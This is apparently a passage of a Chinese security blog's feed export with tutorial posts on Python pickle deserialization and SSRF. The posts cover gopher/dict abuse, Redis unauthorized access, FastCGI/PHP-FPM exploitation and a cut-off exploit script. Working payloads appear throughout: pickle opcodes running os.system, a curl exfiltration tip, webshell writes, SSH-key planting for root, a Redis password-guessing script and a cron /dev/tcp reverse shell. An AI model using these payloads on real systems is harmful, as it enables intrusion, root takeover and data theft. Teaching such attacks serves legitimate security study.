class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nub.&#x27;</span><br></pre></td></tr></table></figure>\n<p>放参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVwhoami\\n.&#x27;</span><br></pre></td></tr></table></figure>\n<p>第二次 BUILD</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVwhoami\\nb.&#x27;</span><br></pre></td></tr></table></figure>\n<p>完成</p>\n<p>一些补充的细节</p>\n<blockquote>\n<p><strong>一</strong>、** 其他模块的 load 也可以触发 pickle 反序列化漏洞。** 例如： <code>numpy.load()</code>  先尝试以 numpy 自己的数据格式导入；如果失败，则尝试以 pickle 的格式导入。因此 <code>numpy.load()</code>  也可以触发 pickle 反序列化漏洞。</p>\n<p>二、即使代码中没有 <code>import os</code> ，<strong>GLOBAL 指令也可以自动导入 <code>os.system</code> </strong>。因此，不能认为 “我不在代码里面导入 os 库，pickle 反序列化的时候就不能执行 os.system”。</p>\n<p>三、** 即使没有回显，也可以很方便地调试恶意代码。** 只需要拥有一台公网服务器，执行 <code>os.system('curl your_server/</code> ls / | base64 <code>)</code> ，然后查询您自己的服务器日志，就能看到结果。这是因为：以 ``` 引号包含的代码，在 sh 中会直接执行，返回其结果。</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI2NDM2My5odG1s\">Python pickle 反序列化详解 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84OTEzMjc2OA==\">从零开始 python 反序列化攻击：pickle 原理解析 &amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYv\">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/06/27/SSRF/",
            "url": "http://example.com/2022/06/27/SSRF/",
            "title": "SSRF",
            "date_published": "2022-06-27T05:38:45.000Z",
            "content_html": "<h2 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<h3 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h3>\n<h4 id=\"1dict协议\"><a class=\"markdownIt-Anchor\" href=\"#1dict协议\">#</a> 1.dict 协议</h4>\n<blockquote>\n<p>dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以看到用这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet dict.org 2628</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325164738004.png\" alt=\"image-20220325164738004\"></p>\n<p>我们输入  <code>define [字典名] [单词]</code>  这样的命令来获取一个单词的解释</p>\n<p>比如说  <code>define english hello</code></p>\n<p>服务器就会返回对应的单词解释</p>\n<p>对弈一些 <code>tcp</code>  协议，用 <code>dict</code>  方法可以打开，在有 <code>waf</code>  的情况下可以获取一些开放的服务信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">// 文件名: main.php</span><br><span class=\"line\">  </span><br><span class=\"line\">$url = &quot;dict://localhost:3306&quot;; // localhost:3306 上架设了我的 mysql 服务</span><br><span class=\"line\"></span><br><span class=\"line\">$ch = curl_init($url);</span><br><span class=\"line\">curl_exec($ch);</span><br><span class=\"line\">curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<p>配合 burpsuite 可以进行端口扫描</p>\n<h4 id=\"gopher协议\"><a class=\"markdownIt-Anchor\" href=\"#gopher协议\">#</a> gopher 协议</h4>\n<p><code>gopher</code>  协议是一种信息查找系统，他将 <code>Internet</code>  上的文件组织成某种索引，方便用户从 <code>Internet</code>  的一处带到另一处。在 <code>WWW</code>  出现之前， <code>Gopher</code>  是 <code>Internet</code>  上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 <code>tcp70</code>  端口。但在 <code>WWW</code>  出现后， <code>Gopher</code>  失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>\n<p><code>gopher</code>  协议格式: <code>gopher://IP:port/_&#123;TCP/IP数据流&#125;</code></p>\n<p>gopher 可以接收 get 和 post 请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a</span><br><span class=\"line\">curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:192.168.194.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=purplet%0d%0A</span><br></pre></td></tr></table></figure>\n<p>ssrf + gopher 可以实现 Redis 未授权访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class=\"line\"></span><br><span class=\"line\">POST /post.php HTTP/1.1</span><br><span class=\"line\">host:192.168.194.1</span><br><span class=\"line\">Content-Type:application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length:12name=purplet</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf-redis-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-redis-未授权访问\">#</a> ssrf + Redis 未授权访问</h3>\n<p>攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作</p>\n<p>攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。</p>\n<p>简单说，漏洞的产生条件有以下两点:</p>\n<p>（1）redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；<br>\n（2）没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>\n<p>1. 启动 redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以指定配置文件启动(若不指定则以默认的配置文件启动)：</span><br><span class=\"line\">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p>安全模式起作用需要同时满足俩个条件：</p>\n<p>(1) redis 没有开启登录认证</p>\n<p>(2) redis 没有绑定到某个 ip 地址或 ip 段</p>\n<p>redis 默认是未开启登录认证，开启安全模式的.</p>\n<p>造成未授权访问有两种情况：</p>\n<ol>\n<li>未开启登录验证，并且把 IP 绑定到 0.0.0.0</li>\n<li>未开启登录验证，没有设置绑定 IP， <code>protected-mode</code>  关闭</li>\n</ol>\n<h4 id=\"利用redis写webshell\"><a class=\"markdownIt-Anchor\" href=\"#利用redis写webshell\">#</a> 利用 Redis 写 webshell</h4>\n<p>通过设置目录后写入备份文件中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20180829154920415-7768410.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxxxxxxxx set x &quot;\\n\\n&lt;?php phpinfo();?&gt;\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<p>用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">访问redis.php</span><br></pre></td></tr></table></figure>\n<p>或者使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">                                                                                                ?&gt;&#x27;);</span><br><span class=\"line\">exit();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用公钥私钥获取root权限\"><a class=\"markdownIt-Anchor\" href=\"#使用公钥私钥获取root权限\">#</a> 使用公钥私钥获取 root 权限</h4>\n<p>生成公私钥，默认路径为 /root/.ssh</p>\n<p>本地生成私钥和公钥，将公钥写入备份文件，使用本地私钥登录</p>\n<p><code>ssh-keygen -t rsa</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改工作路径</span><br><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">set pub &quot;我们刚刚生成的公钥&quot;</span><br><span class=\"line\">登录：ssh -i id_rsa root@172.16.60.166</span><br><span class=\"line\">id -&gt; 得到root</span><br></pre></td></tr></table></figure>\n<h4 id=\"redis未授权访问检测脚本\"><a class=\"markdownIt-Anchor\" href=\"#redis未授权访问检测脚本\">#</a> redis 未授权访问检测脚本</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\"># _*_  coding:utf-8 _*_</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">PASSWORD_DIC=[&#x27;redis&#x27;,&#x27;root&#x27;,&#x27;oracle&#x27;,&#x27;password&#x27;,&#x27;p@aaw0rd&#x27;,&#x27;abc123!&#x27;,&#x27;123456&#x27;,&#x27;admin&#x27;]</span><br><span class=\"line\">def check(ip, port, timeout):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        socket.setdefaulttimeout(timeout)</span><br><span class=\"line\">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        s.connect((ip, int(port)))</span><br><span class=\"line\">        s.send(&quot;INFO\\r\\n&quot;)</span><br><span class=\"line\">        result = s.recv(1024)</span><br><span class=\"line\">        if &quot;redis_version&quot; in result:</span><br><span class=\"line\">            return u&quot;未授权访问&quot;</span><br><span class=\"line\">        elif &quot;Authentication&quot; in result:</span><br><span class=\"line\">            for pass_ in PASSWORD_DIC:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.connect((ip, int(port)))</span><br><span class=\"line\">                s.send(&quot;AUTH %s\\r\\n&quot; %(pass_))</span><br><span class=\"line\">                result = s.recv(1024)</span><br><span class=\"line\">                if &#x27;+OK&#x27; in result:</span><br><span class=\"line\">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class=\"line\">    except Exception, e:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    ip=sys.argv[1]</span><br><span class=\"line\">    port=sys.argv[2]</span><br><span class=\"line\">    print check(ip,port, timeout=10)</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用任务计划反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用任务计划反弹shell\">#</a> 利用任务计划反弹 shell</h4>\n<p>攻击者监听端口</p>\n<p><code>nc -lvnp 4444</code></p>\n<p>将备份放入任务计划中，同时将 crontab 内容写入文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.60.199/1234 0&gt;&amp;1\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron </span><br><span class=\"line\">config set dbfilename  root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p>在反弹的 shell 中可以看数据库连接文件等，同时谁启动的 Redis 反弹就是谁的权限</p>\n<h4 id=\"利用ssrf中curl函数请求redis未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#利用ssrf中curl函数请求redis未授权访问\">#</a> 利用 ssrf 中 curl 函数请求 Redis 未授权访问</h4>\n<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议。而 curl_exec 也是 tcp 的因此可以实现</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1nb3BoZXJ1cy11dTdtNTMwMGEucHk=\">利用 gopherus.py</span></p>\n<p>写入 webshell / 反弹 webshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python gopherus.py --exploit redis </span><br><span class=\"line\">phpwebshell/reverseshell</span><br><span class=\"line\">需要写入的payload</span><br><span class=\"line\">得到最终的payload</span><br></pre></td></tr></table></figure>\n<p>注意：最后得到的 payload 如果从 url 输入需要二次编码，但使用 curl 命令就不需要</p>\n<p>两次因为 gopher 解码一次，url 解码一次</p>\n<h3 id=\"fastcgifpm未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgifpm未授权访问\">#</a> FastCGI，FPM 未授权访问</h3>\n<p>前置知识</p>\n<p>1.fastcgi &amp;&amp; fastcgi record</p>\n<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>\n<p>fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>\n<p>record 组成如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">  /* Header */</span><br><span class=\"line\">  unsigned char version; // 版本</span><br><span class=\"line\">  unsigned char type; // 本次record的类型</span><br><span class=\"line\">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class=\"line\">  unsigned char requestIdB0;</span><br><span class=\"line\">  unsigned char contentLengthB1; // body体的大小</span><br><span class=\"line\">  unsigned char contentLengthB0;</span><br><span class=\"line\">  unsigned char paddingLength; // 额外块大小</span><br><span class=\"line\">  unsigned char reserved; </span><br><span class=\"line\"></span><br><span class=\"line\">  /* Body */</span><br><span class=\"line\">  unsigned char contentData[contentLength];</span><br><span class=\"line\">  unsigned char paddingData[paddingLength];</span><br><span class=\"line\">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>\n<p>头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 body 的大小。</p>\n<p>语言端解析了 fastcgi 头以后，拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。一个 fastcgi record 结构最大支持的 body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>\n<p>2.fastcgi type</p>\n<p><code>type</code>  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 <code>type</code>  来标志每个 record 的作用，用 <code>requestId</code>  作为同一次请求的 id。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg\" alt=\"14931267923354.jpg\"></p>\n<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code>  为 1 的 record，后续互相交流，发送 <code>type</code>  为 4、5、6、7 的 record，结束时发送 <code>type</code>  为 2、3 的 record。</p>\n<p>3.php fpm</p>\n<p>FPM 其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。</p>\n<p>用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> ，如果 web 目录是 <code>/var/www/html</code> ，那么 Nginx 会将这个请求变成如下 key-value 对：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>\n<h4 id=\"iis70解析漏洞\"><a class=\"markdownIt-Anchor\" href=\"#iis70解析漏洞\">#</a> IIS7.0 解析漏洞</h4>\n<p>漏洞现象是，在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code>  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。</p>\n<p>用户请求 <code>http://127.0.0.1/favicon.ico/.php</code> ，nginx 将会发送如下环境变量到 fpm 里：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正常来说， <code>SCRIPT_FILENAME</code>  的值是一个不存在的文件 <code>/var/www/html/favicon.ico/.php</code> ，是 PHP 设置中的一个选项 <code>fix_pathinfo</code>  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 <code>fix_pathinfo</code> ，在这个选项被打开的情况下，fpm 会判断 <code>SCRIPT_FILENAME</code>  是否存在，如果不存在则去掉最后一个 <code>/</code>  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>\n<p>所以，第一次 fpm 发现 <code>/var/www/html/favicon.ico/.php</code>  不存在，则去掉 <code>/.php</code> ，再判断 <code>/var/www/html/favicon.ico</code>  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。</p>\n<p>正确的解决方法有两种，一是在 Nginx 端使用 <code>fastcgi_split_path_info</code>  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 <code>security.limit_extensions</code>  配置项，避免其他后缀文件被解析。</p>\n<h4 id=\"fastcgi-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgi-未授权访问\">#</a> fastcgi 未授权访问</h4>\n<p><strong>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。</strong></p>\n<p><code>SCRIPT_FILENAME</code>  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：</p>\n<p>由于设置了 security.limit_extensions，其限定了只有某些后缀的文件允许被 fpm 执行，默认是 <code>.php</code> 。</p>\n<p>由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。</p>\n<p>我们可以找找默认源安装后可能存在的 php 文件，比如 <code>/usr/local/lib/php/PEAR.php</code> 。</p>\n<p>PHP.INI 中有两个有趣的配置项， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p>\n<p><code>auto_prepend_file</code>  是告诉 PHP，在执行目标文件之前，先包含 <code>auto_prepend_file</code>  中指定的文件； <code>auto_append_file</code>  是告诉 PHP，在执行完成目标文件后，包含 <code>auto_append_file</code>  指向的文件。</p>\n<p>那么就有趣了，假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 <code>allow_url_include</code> ）</p>\n<p>那么，我们怎么设置 <code>auto_prepend_file</code>  的值？</p>\n<p>这又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和 <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为 <code>PHP_INI_USER</code>  和 <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。（ <code>disable_functions</code>  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）</p>\n<p>所以，我们最后传入如下环境变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class=\"line\">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置 <code>auto_prepend_file = php://input</code>  且 <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>\n<p>利用脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 